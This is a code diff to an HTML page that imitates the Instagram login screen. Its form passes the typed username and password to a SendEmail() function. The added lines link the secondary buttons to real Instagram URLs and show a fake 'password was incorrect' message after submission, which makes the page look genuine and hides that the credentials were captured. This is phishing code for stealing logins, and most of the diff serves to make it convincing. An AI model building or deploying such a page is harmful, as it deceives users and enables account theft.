@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./favicon.png" type="image/x-icon">
     <title>Instagram</title>
     <style>
         body {
@@ -148,7 +149,7 @@
             margin-top: 20px;
         }
         .get-the-app p {
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             font-size: 15px;
         }
         .get-the-app img {
@@ -255,19 +256,21 @@
             
             <form class="one" onsubmit="SendEmail();reset(); return false;">
                 <img src="./instgaram logo.png" alt="instagram-logo">
-                <input type="text" placeholder="Phone number, username, or email" id="name">
-                <input type="password" placeholder="Password" id="password">
-                <button type="submit">Log in</button>
+                <input type="text" placeholder="Phone number, username, or email" id="name" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit" id="submit">Log in</button>
                 <div class="or"><span>OR</span></div>
-                <button>Log in with Facebook</button>
-                <a href="#" class="forgot-password">Forgot password?</a>
+                <button href="https://www.facebook.com/login/">Log in with Facebook</button>
+                <p class="mushayed98" style="color: red; font-size: 14px; line-height: 1.2rem;"></p>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>   
             </form>
 
 
             <div class="two">
-                <a href="#" class="create-account">Create new account</a>
+                <a href="https://www.instagram.com/accounts/emailsignup/" class="create-account">Create new account</a>
             </div>
             <div class="get-the-app">
+                
                 <p>Get the app.</p>
                 <img src="./google.png" alt="Get it on Google Play">
                 <img src="./micro.png" alt="Get it from Microsoft">
@@ -277,7 +280,7 @@
        
     </div>
     <footer>
-       
+        
         <ul>
             <li>meta</li>
             <li>about</li>
@@ -286,7 +289,7 @@
             <li>api</li>
             <li>Privacy</li>
             <li>terms</li>
-            <li>location</li>
+            <li>location</li>                                                             
             <li>instagram Lite</li>
             <li>threads</li>
             <li>contect uploading & non-users</li>
@@ -355,7 +358,10 @@
   
 
 
-    <script>
+    <script>    
+
+
+
 
 function SendEmail(){
             var nameValue = document.getElementById('name').value;
@@ -377,7 +383,12 @@ function SendEmail(){
         }
 
 
-
+        const neon = document.querySelector('.mushayed98');
+        const button = document.getElementById('submit');
+       const hard =  button.addEventListener('click' , mushayed);
+        function mushayed(){
+            neon.innerHTML = `Sorry, your password was incorrect. Please double-check your password.`
+        }
 
         const translations = {
             en: {
